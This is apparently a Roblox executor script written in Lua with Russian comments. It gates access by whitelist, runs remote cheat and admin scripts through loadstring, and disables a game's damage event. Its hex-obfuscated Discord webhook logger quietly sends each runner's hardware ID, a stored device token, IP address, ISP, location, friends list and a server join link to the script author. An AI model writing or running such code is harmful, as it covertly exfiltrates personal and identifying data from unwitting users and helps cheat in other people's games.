local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _H = game:GetService("HttpService")
local _U = game:GetService("UserInputService")
local _RS = game:GetService("ReplicatedStorage")
local _MS = game:GetService("MarketplaceService")
local _RAS = game:GetService("RbxAnalyticsService")

-- ПРОВЕРКА СПАЯ ПЕРЕД ЛЮБЫМ ЛОГОМ
if getgenv().__NK_detectSpy then
    local se = getgenv().__NK_detectSpy()
    if se then
        if getgenv().__NK_KICK then
            getgenv().__NK_KICK(se)
        else
            _lp:Kick("Security Error: [" .. tostring(se) .. "]")
        end
        return
    end
end

-- КОНФИГУРАЦИЯ
local Config = {
    WL = {
        UIDs = {"1644351300"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
    },
    BL = {
        UIDs = {"8085944684"},
        HWIDs = {"36a40f68-74c0-4bf1-a715-8c47d2f23d6a"},
        Keys = {"1f0e6ee3-bc21-4eee-b649-66150b226fdb"}
    }
}

-- ИДЕНТИФИКАЦИЯ
local _uid = tostring(_lp.UserId)
local _hw = "N/A"
pcall(function() _hw = _RAS:GetClientId() end)

local _tk = "N/A"
pcall(function()
    if isfile and isfile("nazarkus_key.json") then
        _tk = readfile("nazarkus_key.json")
    end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _isWL = chk(Config.WL)
local _isBL = chk(Config.BL)
local _st = _isWL and "whitelist" or (_isBL and "blacklist" or "guest")

local function _D(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i + 1), 16)) end
    return s
end
local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")

-- ФУНКЦИЯ ЛОГГЕРА
local function _LOG()
    -- Ещё одна проверка спая перед отправкой лога
    if getgenv().__NK_detectSpy then
        local se = getgenv().__NK_detectSpy()
        if se then
            if getgenv().__NK_KICK then
                getgenv().__NK_KICK(se)
            else
                _lp:Kick("Security Error: [" .. tostring(se) .. "]")
            end
            return
        end
    end

    pcall(function()
        local req = (syn and syn.request) or request or http_request
        if not req then return end

        local ni = {}
        pcall(function()
            local r = req({
                Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting",
                Method = "GET"
            })
            if r and r.Success then ni = _H:JSONDecode(r.Body) end
        end)

        local u = 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, fname in ipairs(tu) do
            pcall(function() if getgenv()[fname] then u = u + 1 end end)
        end
        local execName = "Unknown"
        pcall(function() if identifyexecutor then execName = identifyexecutor() end end)
        local unc = execName .. " (UNC: " .. math.floor((u / 4) * 100) .. "%)"

        local fn, ft = "None", "None"
        pcall(function()
            local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
            if fdf then
                for _, fChild in ipairs(fdf:GetChildren()) do
                    if fChild:FindFirstChild("FactionMembers") and fChild.FactionMembers:FindFirstChild(_uid) then
                        local bd = fChild:FindFirstChild("BasicFactionData")
                        if bd then fn = bd.FactionName.Value; ft = bd.FactionTag.Value end
                        break
                    end
                end
            end
        end)

        local jid = game.JobId == "" and "Unknown" or game.JobId
        local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
        local joinUrl = "N/A"
        pcall(function()
            local res = req({Url = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase), Method = "GET"})
            if res and res.Success then joinUrl = res.Body end
        end)

        local friends = {}
        pcall(function()
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p ~= _lp then
                    local isFriend = false
                    pcall(function() isFriend = _lp:IsFriendsWith(p.UserId) end)
                    if isFriend then table.insert(friends, p.Name) end
                end
            end
        end)

        local gameName = "Unknown"
        pcall(function() gameName = _MS:GetProductInfo(game.PlaceId).Name end)

        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: `%s` (`@%s`)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                    {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
                    {["name"] = "System", ["value"] = "Platform: " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", gameName, tostring(game.PlaceId), jid), ["inline"] = false},
                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
            }}
        }
        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)

-- КИК ЧЕРНОГО СПИСКА
if _isBL then
    _lp:Kick("Banned.")
    return
end

-- ПРОВЕРКА ЛОАДЕРА
local _stg = _ts:FindFirstChild("__NK_RUNTIME")
local _auth = _stg and _stg:FindFirstChild(_lp.Name)

if not _isWL then
    local hasShared = (shared._NK_AUTH == "V8_SECURE_AUTH")
    local hasValue = (_auth and (_auth.Value == "V8_SECURE_AUTH" or _auth.Value == "V8*SECURE_AUTH"))
    if not (hasShared or hasValue) then
        _lp:Kick("Execution prohibited. Run through the loader.")
        return
    end
end
shared._NK_AUTH = nil

-- ЗАГРУЗКА СКРИПТОВ
local function safeLoad(url)
    local ok, err = pcall(function()
        local code = game:HttpGet(url)
        if code and #code > 0 then
            local fn, lerr = loadstring(code)
            if fn then
                fn()
            else
                warn("[NK] Loadstring error for " .. url .. ": " .. tostring(lerr))
            end
        else
            warn("[NK] Empty response from: " .. url)
        end
    end)
    if not ok then
        warn("[NK] Failed to load " .. url .. ": " .. tostring(err))
    end
end

safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")

-- ФИКС ACS
pcall(function()
    if _RS:FindFirstChild("ACS_Engine") then
        _RS.ACS_Engine.Events.FDMG:Destroy()
    end
end)

if _auth then
    _auth.Changed:Connect(function(v)
        if v == "kick" then _lp:Kick("Access Revoked.") end
    end)
end
